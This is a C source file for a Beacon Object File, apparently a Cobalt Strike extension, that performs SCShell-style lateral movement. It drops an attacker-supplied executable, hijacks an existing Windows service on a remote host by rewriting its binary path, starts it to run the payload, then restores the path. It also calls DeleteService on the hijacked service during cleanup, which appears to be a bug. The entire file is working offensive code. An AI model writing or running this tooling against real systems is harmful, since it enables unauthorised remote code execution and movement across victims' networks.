/*
    Full credit goes to Mr-Un1k0d3r. This bof is based on his implementation https://github.com/Mr-Un1k0d3r/SCShell/blob/master/CS-BOF/scshellbof.c
*/

#include <windows.h>
#include "beacon.h"

/* Defines */ 
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA( 
    LPCSTR  lpMachineName, 
    LPCSTR  lpDatabaseName, 
    DWORD   dwDesiredAccess 
);

WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(
    SC_HANDLE hSCManager,
    LPCSTR    lpServiceName,
    DWORD     dwDesiredAccess
);

WINADVAPI WINBOOL WINAPI ADVAPI32$StartServiceA(
    SC_HANDLE   hService,
    DWORD       dwNumServiceArgs,
    LPCSTR*     lpServiceArgVectors
);

WINADVAPI WINBOOL WINAPI ADVAPI32$QueryServiceConfigA(
    SC_HANDLE               hService,
    LPQUERY_SERVICE_CONFIGA lpServiceConfig,
    DWORD                   cbBufSize,
    LPDWORD                 pcbBytesNeeded
);

WINADVAPI WINBOOL WINAPI ADVAPI32$ChangeServiceConfigA(
    SC_HANDLE   hService,
    DWORD       dwServiceType,
    DWORD       dwStartType,
    DWORD       dwErrorControl,
    LPCSTR      lpBinaryPathName,
    LPCSTR      lpLoadOrderGroup,
    LPDWORD     lpdwTagId,
    LPCSTR      lpDependencies,
    LPCSTR      lpServiceStartName,
    LPCSTR      lpPassword,
    LPCSTR      lpDisplayName
);

WINADVAPI  WINBOOL WINAPI ADVAPI32$CloseServiceHandle( SC_HANDLE hSCObject );
WINADVAPI  WINBOOL WINAPI ADVAPI32$DeleteService( SC_HANDLE hService );
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError();
WINBASEAPI VOID    WINAPI KERNEL32$CloseHandle( HANDLE Handle );
WINBASEAPI HLOCAL  WINAPI KERNEL32$LocalAlloc( UINT, SIZE_T );
WINBASEAPI HLOCAL  WINAPI KERNEL32$LocalFree( HLOCAL );


/* scshell entrypoint code */ 
VOID go( PVOID Buffer, ULONG Length )
{
    datap  Parser        = { 0 };
    DWORD  SvcBinarySize = 0;
    DWORD  Written       = 0;
    DWORD  SvcQuerySize  = 0;
    PCHAR  Host          = NULL;
    PCHAR  SvcName       = NULL;
    PCHAR  SvcBinary     = NULL;
    PCHAR  SvcPath       = NULL;
    BOOL   Success       = FALSE;

    HANDLE hFile         = NULL;
    HANDLE hSvcManager   = NULL;
    HANDLE hSvcService   = NULL;

    LPQUERY_SERVICE_CONFIGA SvcConfig   = NULL;
    PCHAR                   SvcOrgPath  = NULL;
    DWORD                   SvcConfSize = 0;

    /* Prepare our argument buffer */
    BeaconDataParse( &Parser, Buffer, Length );

    /* Parse our arguments */
    Host      = BeaconDataExtract( &Parser, NULL );
    SvcName   = BeaconDataExtract( &Parser, NULL );
    SvcBinary = BeaconDataExtract( &Parser, &SvcBinarySize );
    SvcPath   = BeaconDataExtract( &Parser, NULL );

    /* Upload service file to target machine (overwrite existing file)*/
    hFile = KERNEL32$CreateFileA( SvcPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE )
    {
        BeaconPrintf( CALLBACK_ERROR, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    if ( ! KERNEL32$WriteFile( hFile, SvcBinary, SvcBinarySize, &Written, NULL ) )
    {
        BeaconPrintf( CALLBACK_ERROR, "WriteFile Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Dropped service executable on %s at %s", Host, SvcPath );

    /* Close the file */
    KERNEL32$CloseHandle( hFile );
    hFile = NULL;

    /* Open Service manager. Create and start our service. The magic happens here :P */
    // NOTE: OpenSCManagerA is going to use SERVICES_ACTIVE_DATABASE by default if lpDatabaseName == NULL. 
    hSvcManager = ADVAPI32$OpenSCManagerA( Host, NULL, SC_MANAGER_ALL_ACCESS );
    if ( ! hSvcManager ) 
    {
      BeaconPrintf( CALLBACK_ERROR, "OpenSCManagerA Failed: %x", KERNEL32$GetLastError() );
      goto EXIT;
    }

    hSvcService = ADVAPI32$OpenServiceA( hSvcManager, SvcName, SERVICE_ALL_ACCESS );
    if ( ! hSvcService ) 
    {
	    BeaconPrintf( CALLBACK_ERROR, "OpenServiceA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    SvcQuerySize = 0;
    ADVAPI32$QueryServiceConfigA( hSvcService, NULL, 0, &SvcQuerySize );
    if ( SvcQuerySize )
    {
        SvcConfSize  = SvcQuerySize;
        SvcConfig    = KERNEL32$LocalAlloc( LPTR, SvcQuerySize );
        SvcQuerySize = 0;
        if ( ! ADVAPI32$QueryServiceConfigA( hSvcService, SvcConfig, SvcConfSize, &SvcQuerySize ) )
        {
            BeaconPrintf( CALLBACK_ERROR, "QueryServiceConfigA [2]. Failed: %d", KERNEL32$GetLastError() );
            goto EXIT;
        }

        SvcOrgPath = SvcConfig->lpBinaryPathName;
        BeaconPrintf( CALLBACK_OUTPUT, "Service original path: %s\n", SvcOrgPath );
    }

    if ( ! ADVAPI32$ChangeServiceConfigA( hSvcService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcPath, NULL, NULL, NULL, NULL, NULL, NULL ) )
    {
        BeaconPrintf( CALLBACK_ERROR, "ChangeServiceConfigA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Service path changed to: %s", SvcPath );

    // TODO: check if service is dead after starting it. maybe we trying to start a buggy one...
    // TODO: add check for ERROR_SERVICE_REQUEST_TIMEOUT
    if ( ! ADVAPI32$StartServiceA( hSvcService, 0, NULL ) ) 
    {
        BeaconPrintf( CALLBACK_ERROR, "CreateServiceA Failed: %x", KERNEL32$GetLastError() );
        goto EXIT;
    }
    BeaconPrintf( CALLBACK_OUTPUT, "Service %s started", SvcName );

    if ( SvcOrgPath )
    {
        if ( ! ADVAPI32$ChangeServiceConfigA( hSvcService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcOrgPath, NULL, NULL, NULL, NULL, NULL, NULL ) )
        {
            BeaconPrintf( CALLBACK_ERROR, "ChangeServiceConfigA Failed: %x", KERNEL32$GetLastError() );
            goto EXIT;
        }
        BeaconPrintf( CALLBACK_OUTPUT, "Service path restored to original: %s", SvcOrgPath );
    }

    Success = TRUE;

EXIT:
    if ( hFile )
    {
        KERNEL32$CloseHandle( hFile );
        hFile = NULL;
    }

    if ( ! ADVAPI32$DeleteService( hSvcService ) ) 
        BeaconPrintf( CALLBACK_ERROR, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );

    if ( SvcConfig )
    {
        KERNEL32$LocalFree( SvcConfig );
        SvcConfig = NULL;
    }

    if ( hSvcService )
    {
        ADVAPI32$CloseServiceHandle( hSvcService );
        hSvcService = NULL;
    }

    if ( hSvcManager )
    {
        ADVAPI32$CloseServiceHandle( hSvcManager );
        hSvcManager = NULL;
    }

    if ( Success )
        BeaconPrintf( CALLBACK_OUTPUT, "scshell successful executed on %s", Host );
    else
        BeaconPrintf( CALLBACK_ERROR, "scshell failed to execut on %s", Host );
}
